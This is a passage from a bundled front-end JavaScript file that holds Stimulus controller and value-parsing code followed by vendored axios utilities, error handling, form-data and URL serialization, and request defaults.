            const valueDescriptor = parseValueDefinitionPair(valueDefinitionPair, this.identifier);
            const attributeName = this.data.getAttributeNameForKey(valueDescriptor.key);
            return Object.assign(result, { [attributeName]: valueDescriptor });
          }, {});
        }
      }
    };
    return valueDefinitionPairs.reduce((properties, valueDefinitionPair) => {
      return Object.assign(properties, propertiesForValueDefinitionPair(valueDefinitionPair));
    }, propertyDescriptorMap);
  }
  function propertiesForValueDefinitionPair(valueDefinitionPair, controller) {
    const definition = parseValueDefinitionPair(valueDefinitionPair, controller);
    const { key, name, reader: read, writer: write } = definition;
    return {
      [name]: {
        get() {
          const value = this.data.get(key);
          if (value !== null) {
            return read(value);
          } else {
            return definition.defaultValue;
          }
        },
        set(value) {
          if (value === void 0) {
            this.data.delete(key);
          } else {
            this.data.set(key, write(value));
          }
        }
      },
      [`has${capitalize(name)}`]: {
        get() {
          return this.data.has(key) || definition.hasCustomDefaultValue;
        }
      }
    };
  }
  function parseValueDefinitionPair([token, typeDefinition], controller) {
    return valueDescriptorForTokenAndTypeDefinition({
      controller,
      token,
      typeDefinition
    });
  }
  function parseValueTypeConstant(constant) {
    switch (constant) {
      case Array:
        return "array";
      case Boolean:
        return "boolean";
      case Number:
        return "number";
      case Object:
        return "object";
      case String:
        return "string";
    }
  }
  function parseValueTypeDefault(defaultValue) {
    switch (typeof defaultValue) {
      case "boolean":
        return "boolean";
      case "number":
        return "number";
      case "string":
        return "string";
    }
    if (Array.isArray(defaultValue))
      return "array";
    if (Object.prototype.toString.call(defaultValue) === "[object Object]")
      return "object";
  }
  function parseValueTypeObject(payload) {
    const { controller, token, typeObject } = payload;
    const hasType = isSomething(typeObject.type);
    const hasDefault = isSomething(typeObject.default);
    const fullObject = hasType && hasDefault;
    const onlyType = hasType && !hasDefault;
    const onlyDefault = !hasType && hasDefault;
    const typeFromObject = parseValueTypeConstant(typeObject.type);
    const typeFromDefaultValue = parseValueTypeDefault(payload.typeObject.default);
    if (onlyType)
      return typeFromObject;
    if (onlyDefault)
      return typeFromDefaultValue;
    if (typeFromObject !== typeFromDefaultValue) {
      const propertyPath = controller ? `${controller}.${token}` : token;
      throw new Error(`The specified default value for the Stimulus Value "${propertyPath}" must match the defined type "${typeFromObject}". The provided default value of "${typeObject.default}" is of type "${typeFromDefaultValue}".`);
    }
    if (fullObject)
      return typeFromObject;
  }
  function parseValueTypeDefinition(payload) {
    const { controller, token, typeDefinition } = payload;
    const typeObject = { controller, token, typeObject: typeDefinition };
    const typeFromObject = parseValueTypeObject(typeObject);
    const typeFromDefaultValue = parseValueTypeDefault(typeDefinition);
    const typeFromConstant = parseValueTypeConstant(typeDefinition);
    const type = typeFromObject || typeFromDefaultValue || typeFromConstant;
    if (type)
      return type;
    const propertyPath = controller ? `${controller}.${typeDefinition}` : token;
    throw new Error(`Unknown value type "${propertyPath}" for "${token}" value`);
  }
  function defaultValueForDefinition(typeDefinition) {
    const constant = parseValueTypeConstant(typeDefinition);
    if (constant)
      return defaultValuesByType[constant];
    const hasDefault = hasProperty(typeDefinition, "default");
    const hasType = hasProperty(typeDefinition, "type");
    const typeObject = typeDefinition;
    if (hasDefault)
      return typeObject.default;
    if (hasType) {
      const { type } = typeObject;
      const constantFromType = parseValueTypeConstant(type);
      if (constantFromType)
        return defaultValuesByType[constantFromType];
    }
    return typeDefinition;
  }
  function valueDescriptorForTokenAndTypeDefinition(payload) {
    const { token, typeDefinition } = payload;
    const key = `${dasherize(token)}-value`;
    const type = parseValueTypeDefinition(payload);
    return {
      type,
      key,
      name: camelize(key),
      get defaultValue() {
        return defaultValueForDefinition(typeDefinition);
      },
      get hasCustomDefaultValue() {
        return parseValueTypeDefault(typeDefinition) !== void 0;
      },
      reader: readers[type],
      writer: writers[type] || writers.default
    };
  }
  var defaultValuesByType = {
    get array() {
      return [];
    },
    boolean: false,
    number: 0,
    get object() {
      return {};
    },
    string: ""
  };
  var readers = {
    array(value) {
      const array = JSON.parse(value);
      if (!Array.isArray(array)) {
        throw new TypeError(`expected value of type "array" but instead got value "${value}" of type "${parseValueTypeDefault(array)}"`);
      }
      return array;
    },
    boolean(value) {
      return !(value == "0" || String(value).toLowerCase() == "false");
    },
    number(value) {
      return Number(value.replace(/_/g, ""));
    },
    object(value) {
      const object = JSON.parse(value);
      if (object === null || typeof object != "object" || Array.isArray(object)) {
        throw new TypeError(`expected value of type "object" but instead got value "${value}" of type "${parseValueTypeDefault(object)}"`);
      }
      return object;
    },
    string(value) {
      return value;
    }
  };
  var writers = {
    default: writeString,
    array: writeJSON,
    object: writeJSON
  };
  function writeJSON(value) {
    return JSON.stringify(value);
  }
  function writeString(value) {
    return `${value}`;
  }
  var Controller = class {
    constructor(context) {
      this.context = context;
    }
    static get shouldLoad() {
      return true;
    }
    static afterLoad(_identifier, _application) {
      return;
    }
    get application() {
      return this.context.application;
    }
    get scope() {
      return this.context.scope;
    }
    get element() {
      return this.scope.element;
    }
    get identifier() {
      return this.scope.identifier;
    }
    get targets() {
      return this.scope.targets;
    }
    get outlets() {
      return this.scope.outlets;
    }
    get classes() {
      return this.scope.classes;
    }
    get data() {
      return this.scope.data;
    }
    initialize() {
    }
    connect() {
    }
    disconnect() {
    }
    dispatch(eventName, { target = this.element, detail = {}, prefix = this.identifier, bubbles = true, cancelable = true } = {}) {
      const type = prefix ? `${prefix}:${eventName}` : eventName;
      const event = new CustomEvent(type, { detail, bubbles, cancelable });
      target.dispatchEvent(event);
      return event;
    }
  };
  Controller.blessings = [
    ClassPropertiesBlessing,
    TargetPropertiesBlessing,
    ValuePropertiesBlessing,
    OutletPropertiesBlessing
  ];
  Controller.targets = [];
  Controller.outlets = [];
  Controller.values = {};

  // app/javascript/controllers/application.js
  var application = Application.start();
  application.debug = false;
  window.Stimulus = application;

  // node_modules/axios/lib/helpers/bind.js
  function bind(fn, thisArg) {
    return function wrap() {
      return fn.apply(thisArg, arguments);
    };
  }

  // node_modules/axios/lib/utils.js
  var { toString } = Object.prototype;
  var { getPrototypeOf } = Object;
  var kindOf = /* @__PURE__ */ ((cache2) => (thing) => {
    const str = toString.call(thing);
    return cache2[str] || (cache2[str] = str.slice(8, -1).toLowerCase());
  })(/* @__PURE__ */ Object.create(null));
  var kindOfTest = (type) => {
    type = type.toLowerCase();
    return (thing) => kindOf(thing) === type;
  };
  var typeOfTest = (type) => (thing) => typeof thing === type;
  var { isArray } = Array;
  var isUndefined = typeOfTest("undefined");
  function isBuffer(val) {
    return val !== null && !isUndefined(val) && val.constructor !== null && !isUndefined(val.constructor) && isFunction(val.constructor.isBuffer) && val.constructor.isBuffer(val);
  }
  var isArrayBuffer = kindOfTest("ArrayBuffer");
  function isArrayBufferView(val) {
    let result;
    if (typeof ArrayBuffer !== "undefined" && ArrayBuffer.isView) {
      result = ArrayBuffer.isView(val);
    } else {
      result = val && val.buffer && isArrayBuffer(val.buffer);
    }
    return result;
  }
  var isString = typeOfTest("string");
  var isFunction = typeOfTest("function");
  var isNumber = typeOfTest("number");
  var isObject = (thing) => thing !== null && typeof thing === "object";
  var isBoolean = (thing) => thing === true || thing === false;
  var isPlainObject = (val) => {
    if (kindOf(val) !== "object") {
      return false;
    }
    const prototype3 = getPrototypeOf(val);
    return (prototype3 === null || prototype3 === Object.prototype || Object.getPrototypeOf(prototype3) === null) && !(Symbol.toStringTag in val) && !(Symbol.iterator in val);
  };
  var isDate = kindOfTest("Date");
  var isFile = kindOfTest("File");
  var isBlob = kindOfTest("Blob");
  var isFileList = kindOfTest("FileList");
  var isStream = (val) => isObject(val) && isFunction(val.pipe);
  var isFormData = (thing) => {
    let kind;
    return thing && (typeof FormData === "function" && thing instanceof FormData || isFunction(thing.append) && ((kind = kindOf(thing)) === "formdata" || // detect form-data instance
    kind === "object" && isFunction(thing.toString) && thing.toString() === "[object FormData]"));
  };
  var isURLSearchParams = kindOfTest("URLSearchParams");
  var trim = (str) => str.trim ? str.trim() : str.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, "");
  function forEach(obj, fn, { allOwnKeys = false } = {}) {
    if (obj === null || typeof obj === "undefined") {
      return;
    }
    let i;
    let l;
    if (typeof obj !== "object") {
      obj = [obj];
    }
    if (isArray(obj)) {
      for (i = 0, l = obj.length; i < l; i++) {
        fn.call(null, obj[i], i, obj);
      }
    } else {
      const keys = allOwnKeys ? Object.getOwnPropertyNames(obj) : Object.keys(obj);
      const len = keys.length;
      let key;
      for (i = 0; i < len; i++) {
        key = keys[i];
        fn.call(null, obj[key], key, obj);
      }
    }
  }
  function findKey(obj, key) {
    key = key.toLowerCase();
    const keys = Object.keys(obj);
    let i = keys.length;
    let _key;
    while (i-- > 0) {
      _key = keys[i];
      if (key === _key.toLowerCase()) {
        return _key;
      }
    }
    return null;
  }
  var _global = (() => {
    if (typeof globalThis !== "undefined")
      return globalThis;
    return typeof self !== "undefined" ? self : typeof window !== "undefined" ? window : global;
  })();
  var isContextDefined = (context) => !isUndefined(context) && context !== _global;
  function merge() {
    const { caseless } = isContextDefined(this) && this || {};
    const result = {};
    const assignValue = (val, key) => {
      const targetKey = caseless && findKey(result, key) || key;
      if (isPlainObject(result[targetKey]) && isPlainObject(val)) {
        result[targetKey] = merge(result[targetKey], val);
      } else if (isPlainObject(val)) {
        result[targetKey] = merge({}, val);
      } else if (isArray(val)) {
        result[targetKey] = val.slice();
      } else {
        result[targetKey] = val;
      }
    };
    for (let i = 0, l = arguments.length; i < l; i++) {
      arguments[i] && forEach(arguments[i], assignValue);
    }
    return result;
  }
  var extend3 = (a, b, thisArg, { allOwnKeys } = {}) => {
    forEach(b, (val, key) => {
      if (thisArg && isFunction(val)) {
        a[key] = bind(val, thisArg);
      } else {
        a[key] = val;
      }
    }, { allOwnKeys });
    return a;
  };
  var stripBOM = (content) => {
    if (content.charCodeAt(0) === 65279) {
      content = content.slice(1);
    }
    return content;
  };
  var inherits = (constructor, superConstructor, props, descriptors2) => {
    constructor.prototype = Object.create(superConstructor.prototype, descriptors2);
    constructor.prototype.constructor = constructor;
    Object.defineProperty(constructor, "super", {
      value: superConstructor.prototype
    });
    props && Object.assign(constructor.prototype, props);
  };
  var toFlatObject = (sourceObj, destObj, filter2, propFilter) => {
    let props;
    let i;
    let prop;
    const merged = {};
    destObj = destObj || {};
    if (sourceObj == null)
      return destObj;
    do {
      props = Object.getOwnPropertyNames(sourceObj);
      i = props.length;
      while (i-- > 0) {
        prop = props[i];
        if ((!propFilter || propFilter(prop, sourceObj, destObj)) && !merged[prop]) {
          destObj[prop] = sourceObj[prop];
          merged[prop] = true;
        }
      }
      sourceObj = filter2 !== false && getPrototypeOf(sourceObj);
    } while (sourceObj && (!filter2 || filter2(sourceObj, destObj)) && sourceObj !== Object.prototype);
    return destObj;
  };
  var endsWith = (str, searchString, position) => {
    str = String(str);
    if (position === void 0 || position > str.length) {
      position = str.length;
    }
    position -= searchString.length;
    const lastIndex = str.indexOf(searchString, position);
    return lastIndex !== -1 && lastIndex === position;
  };
  var toArray = (thing) => {
    if (!thing)
      return null;
    if (isArray(thing))
      return thing;
    let i = thing.length;
    if (!isNumber(i))
      return null;
    const arr = new Array(i);
    while (i-- > 0) {
      arr[i] = thing[i];
    }
    return arr;
  };
  var isTypedArray = /* @__PURE__ */ ((TypedArray) => {
    return (thing) => {
      return TypedArray && thing instanceof TypedArray;
    };
  })(typeof Uint8Array !== "undefined" && getPrototypeOf(Uint8Array));
  var forEachEntry = (obj, fn) => {
    const generator = obj && obj[Symbol.iterator];
    const iterator = generator.call(obj);
    let result;
    while ((result = iterator.next()) && !result.done) {
      const pair = result.value;
      fn.call(obj, pair[0], pair[1]);
    }
  };
  var matchAll = (regExp, str) => {
    let matches;
    const arr = [];
    while ((matches = regExp.exec(str)) !== null) {
      arr.push(matches);
    }
    return arr;
  };
  var isHTMLForm = kindOfTest("HTMLFormElement");
  var toCamelCase = (str) => {
    return str.toLowerCase().replace(
      /[-_\s]([a-z\d])(\w*)/g,
      function replacer(m, p1, p2) {
        return p1.toUpperCase() + p2;
      }
    );
  };
  var hasOwnProperty = (({ hasOwnProperty: hasOwnProperty7 }) => (obj, prop) => hasOwnProperty7.call(obj, prop))(Object.prototype);
  var isRegExp = kindOfTest("RegExp");
  var reduceDescriptors = (obj, reducer) => {
    const descriptors2 = Object.getOwnPropertyDescriptors(obj);
    const reducedDescriptors = {};
    forEach(descriptors2, (descriptor, name) => {
      let ret;
      if ((ret = reducer(descriptor, name, obj)) !== false) {
        reducedDescriptors[name] = ret || descriptor;
      }
    });
    Object.defineProperties(obj, reducedDescriptors);
  };
  var freezeMethods = (obj) => {
    reduceDescriptors(obj, (descriptor, name) => {
      if (isFunction(obj) && ["arguments", "caller", "callee"].indexOf(name) !== -1) {
        return false;
      }
      const value = obj[name];
      if (!isFunction(value))
        return;
      descriptor.enumerable = false;
      if ("writable" in descriptor) {
        descriptor.writable = false;
        return;
      }
      if (!descriptor.set) {
        descriptor.set = () => {
          throw Error("Can not rewrite read-only method '" + name + "'");
        };
      }
    });
  };
  var toObjectSet = (arrayOrString, delimiter) => {
    const obj = {};
    const define2 = (arr) => {
      arr.forEach((value) => {
        obj[value] = true;
      });
    };
    isArray(arrayOrString) ? define2(arrayOrString) : define2(String(arrayOrString).split(delimiter));
    return obj;
  };
  var noop = () => {
  };
  var toFiniteNumber = (value, defaultValue) => {
    value = +value;
    return Number.isFinite(value) ? value : defaultValue;
  };
  var ALPHA = "abcdefghijklmnopqrstuvwxyz";
  var DIGIT = "0123456789";
  var ALPHABET = {
    DIGIT,
    ALPHA,
    ALPHA_DIGIT: ALPHA + ALPHA.toUpperCase() + DIGIT
  };
  var generateString = (size = 16, alphabet = ALPHABET.ALPHA_DIGIT) => {
    let str = "";
    const { length } = alphabet;
    while (size--) {
      str += alphabet[Math.random() * length | 0];
    }
    return str;
  };
  function isSpecCompliantForm(thing) {
    return !!(thing && isFunction(thing.append) && thing[Symbol.toStringTag] === "FormData" && thing[Symbol.iterator]);
  }
  var toJSONObject = (obj) => {
    const stack = new Array(10);
    const visit2 = (source, i) => {
      if (isObject(source)) {
        if (stack.indexOf(source) >= 0) {
          return;
        }
        if (!("toJSON" in source)) {
          stack[i] = source;
          const target = isArray(source) ? [] : {};
          forEach(source, (value, key) => {
            const reducedValue = visit2(value, i + 1);
            !isUndefined(reducedValue) && (target[key] = reducedValue);
          });
          stack[i] = void 0;
          return target;
        }
      }
      return source;
    };
    return visit2(obj, 0);
  };
  var isAsyncFn = kindOfTest("AsyncFunction");
  var isThenable = (thing) => thing && (isObject(thing) || isFunction(thing)) && isFunction(thing.then) && isFunction(thing.catch);
  var utils_default = {
    isArray,
    isArrayBuffer,
    isBuffer,
    isFormData,
    isArrayBufferView,
    isString,
    isNumber,
    isBoolean,
    isObject,
    isPlainObject,
    isUndefined,
    isDate,
    isFile,
    isBlob,
    isRegExp,
    isFunction,
    isStream,
    isURLSearchParams,
    isTypedArray,
    isFileList,
    forEach,
    merge,
    extend: extend3,
    trim,
    stripBOM,
    inherits,
    toFlatObject,
    kindOf,
    kindOfTest,
    endsWith,
    toArray,
    forEachEntry,
    matchAll,
    isHTMLForm,
    hasOwnProperty,
    hasOwnProp: hasOwnProperty,
    // an alias to avoid ESLint no-prototype-builtins detection
    reduceDescriptors,
    freezeMethods,
    toObjectSet,
    toCamelCase,
    noop,
    toFiniteNumber,
    findKey,
    global: _global,
    isContextDefined,
    ALPHABET,
    generateString,
    isSpecCompliantForm,
    toJSONObject,
    isAsyncFn,
    isThenable
  };

  // node_modules/axios/lib/core/AxiosError.js
  function AxiosError(message, code, config, request, response) {
    Error.call(this);
    if (Error.captureStackTrace) {
      Error.captureStackTrace(this, this.constructor);
    } else {
      this.stack = new Error().stack;
    }
    this.message = message;
    this.name = "AxiosError";
    code && (this.code = code);
    config && (this.config = config);
    request && (this.request = request);
    response && (this.response = response);
  }
  utils_default.inherits(AxiosError, Error, {
    toJSON: function toJSON() {
      return {
        // Standard
        message: this.message,
        name: this.name,
        // Microsoft
        description: this.description,
        number: this.number,
        // Mozilla
        fileName: this.fileName,
        lineNumber: this.lineNumber,
        columnNumber: this.columnNumber,
        stack: this.stack,
        // Axios
        config: utils_default.toJSONObject(this.config),
        code: this.code,
        status: this.response && this.response.status ? this.response.status : null
      };
    }
  });
  var prototype = AxiosError.prototype;
  var descriptors = {};
  [
    "ERR_BAD_OPTION_VALUE",
    "ERR_BAD_OPTION",
    "ECONNABORTED",
    "ETIMEDOUT",
    "ERR_NETWORK",
    "ERR_FR_TOO_MANY_REDIRECTS",
    "ERR_DEPRECATED",
    "ERR_BAD_RESPONSE",
    "ERR_BAD_REQUEST",
    "ERR_CANCELED",
    "ERR_NOT_SUPPORT",
    "ERR_INVALID_URL"
    // eslint-disable-next-line func-names
  ].forEach((code) => {
    descriptors[code] = { value: code };
  });
  Object.defineProperties(AxiosError, descriptors);
  Object.defineProperty(prototype, "isAxiosError", { value: true });
  AxiosError.from = (error2, code, config, request, response, customProps) => {
    const axiosError = Object.create(prototype);
    utils_default.toFlatObject(error2, axiosError, function filter2(obj) {
      return obj !== Error.prototype;
    }, (prop) => {
      return prop !== "isAxiosError";
    });
    AxiosError.call(axiosError, error2.message, code, config, request, response);
    axiosError.cause = error2;
    axiosError.name = error2.name;
    customProps && Object.assign(axiosError, customProps);
    return axiosError;
  };
  var AxiosError_default = AxiosError;

  // node_modules/axios/lib/helpers/null.js
  var null_default = null;

  // node_modules/axios/lib/helpers/toFormData.js
  function isVisitable(thing) {
    return utils_default.isPlainObject(thing) || utils_default.isArray(thing);
  }
  function removeBrackets(key) {
    return utils_default.endsWith(key, "[]") ? key.slice(0, -2) : key;
  }
  function renderKey(path, key, dots) {
    if (!path)
      return key;
    return path.concat(key).map(function each(token, i) {
      token = removeBrackets(token);
      return !dots && i ? "[" + token + "]" : token;
    }).join(dots ? "." : "");
  }
  function isFlatArray(arr) {
    return utils_default.isArray(arr) && !arr.some(isVisitable);
  }
  var predicates = utils_default.toFlatObject(utils_default, {}, null, function filter(prop) {
    return /^is[A-Z]/.test(prop);
  });
  function toFormData(obj, formData, options) {
    if (!utils_default.isObject(obj)) {
      throw new TypeError("target must be an object");
    }
    formData = formData || new (null_default || FormData)();
    options = utils_default.toFlatObject(options, {
      metaTokens: true,
      dots: false,
      indexes: false
    }, false, function defined(option, source) {
      return !utils_default.isUndefined(source[option]);
    });
    const metaTokens = options.metaTokens;
    const visitor = options.visitor || defaultVisitor;
    const dots = options.dots;
    const indexes = options.indexes;
    const _Blob = options.Blob || typeof Blob !== "undefined" && Blob;
    const useBlob = _Blob && utils_default.isSpecCompliantForm(formData);
    if (!utils_default.isFunction(visitor)) {
      throw new TypeError("visitor must be a function");
    }
    function convertValue(value) {
      if (value === null)
        return "";
      if (utils_default.isDate(value)) {
        return value.toISOString();
      }
      if (!useBlob && utils_default.isBlob(value)) {
        throw new AxiosError_default("Blob is not supported. Use a Buffer instead.");
      }
      if (utils_default.isArrayBuffer(value) || utils_default.isTypedArray(value)) {
        return useBlob && typeof Blob === "function" ? new Blob([value]) : Buffer.from(value);
      }
      return value;
    }
    function defaultVisitor(value, key, path) {
      let arr = value;
      if (value && !path && typeof value === "object") {
        if (utils_default.endsWith(key, "{}")) {
          key = metaTokens ? key : key.slice(0, -2);
          value = JSON.stringify(value);
        } else if (utils_default.isArray(value) && isFlatArray(value) || (utils_default.isFileList(value) || utils_default.endsWith(key, "[]")) && (arr = utils_default.toArray(value))) {
          key = removeBrackets(key);
          arr.forEach(function each(el, index) {
            !(utils_default.isUndefined(el) || el === null) && formData.append(
              // eslint-disable-next-line no-nested-ternary
              indexes === true ? renderKey([key], index, dots) : indexes === null ? key : key + "[]",
              convertValue(el)
            );
          });
          return false;
        }
      }
      if (isVisitable(value)) {
        return true;
      }
      formData.append(renderKey(path, key, dots), convertValue(value));
      return false;
    }
    const stack = [];
    const exposedHelpers = Object.assign(predicates, {
      defaultVisitor,
      convertValue,
      isVisitable
    });
    function build(value, path) {
      if (utils_default.isUndefined(value))
        return;
      if (stack.indexOf(value) !== -1) {
        throw Error("Circular reference detected in " + path.join("."));
      }
      stack.push(value);
      utils_default.forEach(value, function each(el, key) {
        const result = !(utils_default.isUndefined(el) || el === null) && visitor.call(
          formData,
          el,
          utils_default.isString(key) ? key.trim() : key,
          path,
          exposedHelpers
        );
        if (result === true) {
          build(el, path ? path.concat(key) : [key]);
        }
      });
      stack.pop();
    }
    if (!utils_default.isObject(obj)) {
      throw new TypeError("data must be an object");
    }
    build(obj);
    return formData;
  }
  var toFormData_default = toFormData;

  // node_modules/axios/lib/helpers/AxiosURLSearchParams.js
  function encode(str) {
    const charMap = {
      "!": "%21",
      "'": "%27",
      "(": "%28",
      ")": "%29",
      "~": "%7E",
      "%20": "+",
      "%00": "\0"
    };
    return encodeURIComponent(str).replace(/[!'()~]|%20|%00/g, function replacer(match) {
      return charMap[match];
    });
  }
  function AxiosURLSearchParams(params, options) {
    this._pairs = [];
    params && toFormData_default(params, this, options);
  }
  var prototype2 = AxiosURLSearchParams.prototype;
  prototype2.append = function append(name, value) {
    this._pairs.push([name, value]);
  };
  prototype2.toString = function toString2(encoder) {
    const _encode = encoder ? function(value) {
      return encoder.call(this, value, encode);
    } : encode;
    return this._pairs.map(function each(pair) {
      return _encode(pair[0]) + "=" + _encode(pair[1]);
    }, "").join("&");
  };
  var AxiosURLSearchParams_default = AxiosURLSearchParams;

  // node_modules/axios/lib/helpers/buildURL.js
  function encode2(val) {
    return encodeURIComponent(val).replace(/%3A/gi, ":").replace(/%24/g, "$").replace(/%2C/gi, ",").replace(/%20/g, "+").replace(/%5B/gi, "[").replace(/%5D/gi, "]");
  }
  function buildURL(url, params, options) {
    if (!params) {
      return url;
    }
    const _encode = options && options.encode || encode2;
    const serializeFn = options && options.serialize;
    let serializedParams;
    if (serializeFn) {
      serializedParams = serializeFn(params, options);
    } else {
      serializedParams = utils_default.isURLSearchParams(params) ? params.toString() : new AxiosURLSearchParams_default(params, options).toString(_encode);
    }
    if (serializedParams) {
      const hashmarkIndex = url.indexOf("#");
      if (hashmarkIndex !== -1) {
        url = url.slice(0, hashmarkIndex);
      }
      url += (url.indexOf("?") === -1 ? "?" : "&") + serializedParams;
    }
    return url;
  }

  // node_modules/axios/lib/core/InterceptorManager.js
  var InterceptorManager = class {
    constructor() {
      this.handlers = [];
    }
    /**
     * Add a new interceptor to the stack
     *
     * @param {Function} fulfilled The function to handle `then` for a `Promise`
     * @param {Function} rejected The function to handle `reject` for a `Promise`
     *
     * @return {Number} An ID used to remove interceptor later
     */
    use(fulfilled, rejected, options) {
      this.handlers.push({
        fulfilled,
        rejected,
        synchronous: options ? options.synchronous : false,
        runWhen: options ? options.runWhen : null
      });
      return this.handlers.length - 1;
    }
    /**
     * Remove an interceptor from the stack
     *
     * @param {Number} id The ID that was returned by `use`
     *
     * @returns {Boolean} `true` if the interceptor was removed, `false` otherwise
     */
    eject(id) {
      if (this.handlers[id]) {
        this.handlers[id] = null;
      }
    }
    /**
     * Clear all interceptors from the stack
     *
     * @returns {void}
     */
    clear() {
      if (this.handlers) {
        this.handlers = [];
      }
    }
    /**
     * Iterate over all the registered interceptors
     *
     * This method is particularly useful for skipping over any
     * interceptors that may have become `null` calling `eject`.
     *
     * @param {Function} fn The function to call for each interceptor
     *
     * @returns {void}
     */
    forEach(fn) {
      utils_default.forEach(this.handlers, function forEachHandler(h) {
        if (h !== null) {
          fn(h);
        }
      });
    }
  };
  var InterceptorManager_default = InterceptorManager;

  // node_modules/axios/lib/defaults/transitional.js
  var transitional_default = {
    silentJSONParsing: true,
    forcedJSONParsing: true,
    clarifyTimeoutError: false
  };

  // node_modules/axios/lib/platform/browser/classes/URLSearchParams.js
  var URLSearchParams_default = typeof URLSearchParams !== "undefined" ? URLSearchParams : AxiosURLSearchParams_default;

  // node_modules/axios/lib/platform/browser/classes/FormData.js
  var FormData_default = typeof FormData !== "undefined" ? FormData : null;

  // node_modules/axios/lib/platform/browser/classes/Blob.js
  var Blob_default = typeof Blob !== "undefined" ? Blob : null;

  // node_modules/axios/lib/platform/browser/index.js
  var browser_default = {
    isBrowser: true,
    classes: {
      URLSearchParams: URLSearchParams_default,
      FormData: FormData_default,
      Blob: Blob_default
    },
    protocols: ["http", "https", "file", "blob", "url", "data"]
  };

  // node_modules/axios/lib/platform/common/utils.js
  var utils_exports = {};
  __export(utils_exports, {
    hasBrowserEnv: () => hasBrowserEnv,
    hasStandardBrowserEnv: () => hasStandardBrowserEnv,
    hasStandardBrowserWebWorkerEnv: () => hasStandardBrowserWebWorkerEnv
  });
  var hasBrowserEnv = typeof window !== "undefined" && typeof document !== "undefined";
  var hasStandardBrowserEnv = ((product) => {
    return hasBrowserEnv && ["ReactNative", "NativeScript", "NS"].indexOf(product) < 0;
  })(typeof navigator !== "undefined" && navigator.product);
  var hasStandardBrowserWebWorkerEnv = (() => {
    return typeof WorkerGlobalScope !== "undefined" && // eslint-disable-next-line no-undef
    self instanceof WorkerGlobalScope && typeof self.importScripts === "function";
  })();

  // node_modules/axios/lib/platform/index.js
  var platform_default = {
    ...utils_exports,
    ...browser_default
  };

  // node_modules/axios/lib/helpers/toURLEncodedForm.js
  function toURLEncodedForm(data, options) {
    return toFormData_default(data, new platform_default.classes.URLSearchParams(), Object.assign({
      visitor: function(value, key, path, helpers) {
        if (platform_default.isNode && utils_default.isBuffer(value)) {
          this.append(key, value.toString("base64"));
          return false;
        }
        return helpers.defaultVisitor.apply(this, arguments);
      }
    }, options));
  }

  // node_modules/axios/lib/helpers/formDataToJSON.js
  function parsePropPath(name) {
    return utils_default.matchAll(/\w+|\[(\w*)]/g, name).map((match) => {
      return match[0] === "[]" ? "" : match[1] || match[0];
    });
  }
  function arrayToObject(arr) {
    const obj = {};
    const keys = Object.keys(arr);
    let i;
    const len = keys.length;
    let key;
    for (i = 0; i < len; i++) {
      key = keys[i];
      obj[key] = arr[key];
    }
    return obj;
  }
  function formDataToJSON(formData) {
    function buildPath(path, value, target, index) {
      let name = path[index++];
      if (name === "__proto__")
        return true;
      const isNumericKey = Number.isFinite(+name);
      const isLast = index >= path.length;
      name = !name && utils_default.isArray(target) ? target.length : name;
      if (isLast) {
        if (utils_default.hasOwnProp(target, name)) {
          target[name] = [target[name], value];
        } else {
          target[name] = value;
        }
        return !isNumericKey;
      }
      if (!target[name] || !utils_default.isObject(target[name])) {
        target[name] = [];
      }
      const result = buildPath(path, value, target[name], index);
      if (result && utils_default.isArray(target[name])) {
        target[name] = arrayToObject(target[name]);
      }
      return !isNumericKey;
    }
    if (utils_default.isFormData(formData) && utils_default.isFunction(formData.entries)) {
      const obj = {};
      utils_default.forEachEntry(formData, (name, value) => {
        buildPath(parsePropPath(name), value, obj, 0);
      });
      return obj;
    }
    return null;
  }
  var formDataToJSON_default = formDataToJSON;

  // node_modules/axios/lib/defaults/index.js
  function stringifySafely(rawValue, parser, encoder) {
    if (utils_default.isString(rawValue)) {
      try {
        (parser || JSON.parse)(rawValue);
        return utils_default.trim(rawValue);
      } catch (e) {
        if (e.name !== "SyntaxError") {
          throw e;
        }
      }
    }
    return (encoder || JSON.stringify)(rawValue);
  }
  var defaults = {
    transitional: transitional_default,
    adapter: ["xhr", "http"],
    transformRequest: [function transformRequest(data, headers) {
      const contentType = headers.getContentType() || "";
      const hasJSONContentType = contentType.indexOf("application/json") > -1;
      const isObjectPayload = utils_default.isObject(data);
      if (isObjectPayload && utils_default.isHTMLForm(data)) {
        data = new FormData(data);
      }
      const isFormData2 = utils_default.isFormData(data);
      if (isFormData2) {
        return hasJSONContentType ? JSON.stringify(formDataToJSON_default(data)) : data;
      }
      if (utils_default.isArrayBuffer(data) || utils_default.isBuffer(data) || utils_default.isStream(data) || utils_default.isFile(data) || utils_default.isBlob(data)) {
        return data;
      }
      if (utils_default.isArrayBufferView(data)) {
        return data.buffer;
      }
      if (utils_default.isURLSearchParams(data)) {
        headers.setContentType("application/x-www-form-urlencoded;charset=utf-8", false);
        return data.toString();
      }
      let isFileList2;
      if (isObjectPayload) {
        if (contentType.indexOf("application/x-www-form-urlencoded") > -1) {
          return toURLEncodedForm(data, this.formSerializer).toString();
        }
        if ((isFileList2 = utils_default.isFileList(data)) || contentType.indexOf("multipart/form-data") > -1) {
          const _FormData = this.env && this.env.FormData;
          return toFormData_default(
            isFileList2 ? { "files[]": data } : data,
            _FormData && new _FormData(),
            this.formSerializer
          );
        }
      }
      if (isObjectPayload || hasJSONContentType) {
        headers.setContentType("application/json", false);
        return stringifySafely(data);
      }
      return data;
    }],
    transformResponse: [function transformResponse(data) {
      const transitional2 = this.transitional || defaults.transitional;
      const forcedJSONParsing = transitional2 && transitional2.forcedJSONParsing;
      const JSONRequested = this.responseType === "json";
      if (data && utils_default.isString(data) && (forcedJSONParsing && !this.responseType || JSONRequested)) {
        const silentJSONParsing = transitional2 && transitional2.silentJSONParsing;
        const strictJSONParsing = !silentJSONParsing && JSONRequested;
        try {
          return JSON.parse(data);
        } catch (e) {
          if (strictJSONParsing) {
            if (e.name === "SyntaxError") {
              throw AxiosError_default.from(e, AxiosError_default.ERR_BAD_RESPONSE, this, null, this.response);
            }
            throw e;
          }
        }
      }
      return data;
    }],
    /**
     * A timeout in milliseconds to abort a request. If set to 0 (default) a
     * timeout is not created.
     */
    timeout: 0,
    xsrfCookieName: "XSRF-TOKEN",
    xsrfHeaderName: "X-XSRF-TOKEN",
    maxContentLength: -1,
    maxBodyLength: -1,
    env: {
      FormData: platform_default.classes.FormData,
      Blob: platform_default.classes.Blob
    },
    validateStatus: function validateStatus(status) {
      return status >= 200 && status < 300;
    },
    headers: {
      common: {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": void 0
      }
    }
  };
